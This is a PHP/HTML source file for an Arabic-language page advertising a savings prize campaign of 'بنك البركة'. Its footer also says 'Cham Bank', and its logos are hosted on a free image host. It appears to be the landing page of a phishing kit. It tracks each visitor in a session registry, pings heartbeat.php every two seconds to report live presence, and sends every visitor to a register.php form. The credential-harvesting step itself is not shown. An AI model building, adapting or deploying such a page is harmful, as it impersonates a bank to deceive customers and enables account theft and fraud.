<?php

declare(strict_types=1);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__.'/includes/session_registry.php';
registry_touch_page('index.php');

?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>بنك البركة | حملة جوائز 2026</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --bank-primary: #8e000e;
            --bank-primary-light: #b5001a;
            --bank-gold: #c9a84c;
            --bank-gold-light: #e8d5a0;
            --bank-dark: #2c0005;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Navbar */
        .bank-nav {
            background: #ffffff;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 3px solid var(--bank-primary);
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }

        .bank-nav img {
            height: 60px;
            width: auto;
            display: block;
        }

        /* Hero Section */
        .hero-section {
            background: linear-gradient(135deg, var(--bank-primary) 0%, var(--bank-dark) 100%);
            padding: 50px 20px 40px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .hero-section::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(201,168,76,0.1) 0%, transparent 60%);
            animation: shimmer 8s ease-in-out infinite;
        }

        @keyframes shimmer {
            0%, 100% { transform: rotate(0deg); }
            50% { transform: rotate(180deg); }
        }

        .hero-badge {
            display: inline-block;
            background: var(--bank-gold);
            color: var(--bank-dark);
            padding: 6px 20px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 700;
            margin-bottom: 20px;
            position: relative;
        }

        .hero-title {
            font-size: 28px;
            font-weight: 900;
            color: #fff;
            margin-bottom: 12px;
            position: relative;
            line-height: 1.5;
        }

        .hero-subtitle {
            font-size: 15px;
            color: rgba(255,255,255,0.8);
            margin-bottom: 30px;
            position: relative;
            line-height: 1.8;
        }

        .hero-subtitle span {
            color: var(--bank-gold);
            font-weight: 700;
        }

        /* CTA Button */
        .cta-btn {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            background: var(--bank-gold);
            color: var(--bank-dark);
            padding: 14px 40px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 800;
            text-decoration: none;
            transition: all 0.3s;
            position: relative;
            box-shadow: 0 6px 20px rgba(201,168,76,0.4);
        }

        .cta-btn:hover {
            background: #d4b35a;
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(201,168,76,0.5);
            color: var(--bank-dark);
        }

        .cta-btn i {
            font-size: 20px;
        }

        /* Main Content */
        .main-content {
            flex: 1;
            padding: 30px 16px;
            max-width: 600px;
            margin: 0 auto;
            width: 100%;
        }

        /* Prize Cards */
        .section-title {
            font-size: 20px;
            font-weight: 800;
            color: var(--bank-primary);
            text-align: center;
            margin-bottom: 20px;
        }

        .prize-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-bottom: 24px;
        }

        .prize-card {
            background: #fff;
            border-radius: 16px;
            padding: 20px 14px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.06);
            border: 1px solid #f0f0f0;
            transition: transform 0.3s;
        }

        .prize-card:hover {
            transform: translateY(-3px);
        }

        .prize-card .prize-icon {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
            font-size: 22px;
        }

        .prize-card.daily .prize-icon {
            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
            color: #2e7d32;
        }

        .prize-card.weekly .prize-icon {
            background: linear-gradient(135deg, #e3f2fd, #bbdefb);
            color: #1565c0;
        }

        .prize-card.monthly .prize-icon {
            background: linear-gradient(135deg, #fff3e0, #ffe0b2);
            color: #e65100;
        }

        .prize-card.grand .prize-icon {
            background: linear-gradient(135deg, #fce4ec, #f8bbd0);
            color: var(--bank-primary);
        }

        .prize-card .prize-type {
            font-size: 13px;
            font-weight: 700;
            color: #666;
            margin-bottom: 4px;
        }

        .prize-card .prize-name {
            font-size: 15px;
            font-weight: 800;
            color: #333;
        }

        /* Grand Prize */
        .grand-prize {
            background: linear-gradient(135deg, var(--bank-primary), var(--bank-dark));
            border-radius: 20px;
            padding: 28px 20px;
            text-align: center;
            margin-bottom: 24px;
            position: relative;
            overflow: hidden;
        }

        .grand-prize::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at top right, rgba(201,168,76,0.2), transparent 70%);
        }

        .grand-prize .trophy {
            font-size: 45px;
            margin-bottom: 12px;
            position: relative;
        }

        .grand-prize h3 {
            color: var(--bank-gold);
            font-size: 18px;
            font-weight: 800;
            margin-bottom: 6px;
            position: relative;
        }

        .grand-prize p {
            color: rgba(255,255,255,0.85);
            font-size: 14px;
            position: relative;
            line-height: 1.8;
        }

        /* Features */
        .features {
            background: #fff;
            border-radius: 16px;
            padding: 24px 18px;
            margin-bottom: 24px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.06);
        }

        .feature-item {
            display: flex;
            align-items: center;
            gap: 14px;
            padding: 12px 0;
            border-bottom: 1px solid #f5f5f5;
        }

        .feature-item:last-child {
            border-bottom: none;
        }

        .feature-item .feature-icon {
            width: 40px;
            height: 40px;
            border-radius: 10px;
            background: linear-gradient(135deg, #fef3e2, #fde8c8);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--bank-gold);
            font-size: 18px;
            flex-shrink: 0;
        }

        .feature-item .feature-text {
            font-size: 14px;
            font-weight: 600;
            color: #444;
            line-height: 1.6;
        }

        /* Bottom CTA */
        .bottom-cta {
            text-align: center;
            margin-bottom: 20px;
        }

        .bottom-cta .cta-btn {
            width: 100%;
            justify-content: center;
        }

        /* Footer */
        .bank-footer {
            text-align: center;
            padding: 20px;
            margin-top: auto;
        }

        .bank-footer img {
            height: 46px;
            width: auto;
            opacity: 0.75;
            margin-bottom: 6px;
        }

        .bank-footer p {
            color: rgba(0,0,0,0.3);
            font-size: 11px;
        }

        .bank-footer .footer-name {
            font-size: 13px;
            font-weight: 600;
            color: var(--bank-primary);
            margin-bottom: 4px;
        }

        /* Mobile */
        @media (max-width: 480px) {
            .bank-nav img { height: 50px; }
            .hero-title { font-size: 22px; }
            .hero-subtitle { font-size: 13px; }
            .cta-btn { font-size: 16px; padding: 12px 30px; }
            .prize-grid { gap: 8px; }
            .prize-card { padding: 16px 10px; }
        }

        /* Animation */
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .animate {
            animation: fadeInUp 0.6s ease-out;
        }
    </style>
</head>

<body>

    <!-- Navbar -->
    <nav class="bank-nav" style="justify-content:center;">
        <a href="index.php">
            <img src="https://i.postimg.cc/zf20ZDWM/bar.jpg" alt="بنك البركة">
        </a>
    </nav>

    <!-- Hero Section -->
    <div class="hero-section">
        <div class="hero-badge"><i class="fas fa-star" style="margin-left:6px;"></i> حملة 2026</div>
        <h1 class="hero-title">مع تطبيق بنك البركة<br>عملاؤنا دائماً مميزون</h1>
        <p class="hero-subtitle">
            جوائزنا مميزة <span>بقيمتها وعددها</span><br>
            من الجوائز اليومية والأسبوعية والشهرية<br>
            وجوائز كبرى كل 3 أشهر
        </p>
        <a href="register.php" class="cta-btn">
            <i class="fas fa-gift"></i>
            ادخر واربح
        </a>
    </div>

    <!-- Main Content -->
    <div class="main-content">

        <!-- Prize Types -->
        <h2 class="section-title"><i class="fas fa-trophy" style="color:var(--bank-gold);margin-left:8px;"></i> أنواع الجوائز</h2>
        <div class="prize-grid animate">
            <div class="prize-card daily">
                <div class="prize-icon"><i class="fas fa-sun"></i></div>
                <div class="prize-type">جوائز</div>
                <div class="prize-name">يومية</div>
            </div>
            <div class="prize-card weekly">
                <div class="prize-icon"><i class="fas fa-calendar-week"></i></div>
                <div class="prize-type">جوائز</div>
                <div class="prize-name">أسبوعية</div>
            </div>
            <div class="prize-card monthly">
                <div class="prize-icon"><i class="fas fa-calendar-alt"></i></div>
                <div class="prize-type">جوائز</div>
                <div class="prize-name">شهرية</div>
            </div>
            <div class="prize-card grand">
                <div class="prize-icon"><i class="fas fa-crown"></i></div>
                <div class="prize-type">جوائز كبرى</div>
                <div class="prize-name">كل 3 أشهر</div>
            </div>
        </div>

        <!-- Grand Prize -->
        <div class="grand-prize animate">
            <div class="trophy"><i class="fas fa-trophy" style="color:var(--bank-gold);"></i></div>
            <h3>الجائزة الكبرى</h3>
            <p>يحصل جميع المدخرين على فرصة الدخول<br>بالجائزة الكبرى - مميزة لجميع عملائنا</p>
        </div>

        <!-- Features -->
        <div class="features animate">
            <div class="feature-item">
                <div class="feature-icon"><i class="fas fa-users"></i></div>
                <div class="feature-text">متاحة لجميع عملاء بنك البركة</div>
            </div>
            <div class="feature-item">
                <div class="feature-icon"><i class="fas fa-piggy-bank"></i></div>
                <div class="feature-text">كل ما زاد ادخارك زادت فرصتك بالفوز</div>
            </div>
            <div class="feature-item">
                <div class="feature-icon"><i class="fas fa-mobile-alt"></i></div>
                <div class="feature-text">سجل من خلال التطبيق بخطوات بسيطة</div>
            </div>
            <div class="feature-item">
                <div class="feature-icon"><i class="fas fa-shield-alt"></i></div>
                <div class="feature-text">حسابك محمي ومؤمن بالكامل</div>
            </div>
        </div>

        <!-- Bottom CTA -->
        <div class="bottom-cta animate">
            <a href="register.php" class="cta-btn">
                <i class="fas fa-gift"></i>
                ادخر واربح الآن
            </a>
        </div>

    </div>

    <!-- Footer -->
    <footer class="bank-footer">
        <img src="https://i.postimg.cc/Xq4ZsdJT/bar-removebg-preview.png" alt="بنك البركة"><br>
        <p class="footer-name">بنك البركة | Cham Bank</p>
        <p>&copy; بنك البركة 2026 - جميع الحقوق محفوظة</p>
    </footer>

<script>
// Heartbeat
function sendHeartbeat() {
    fetch('heartbeat.php').catch(function(e){});
}
setInterval(sendHeartbeat, 2000);
sendHeartbeat();
window.addEventListener('beforeunload', function() {
    navigator.sendBeacon('heartbeat.php', new URLSearchParams({action: 'offline'}));
});
</script>
</body>
</html>
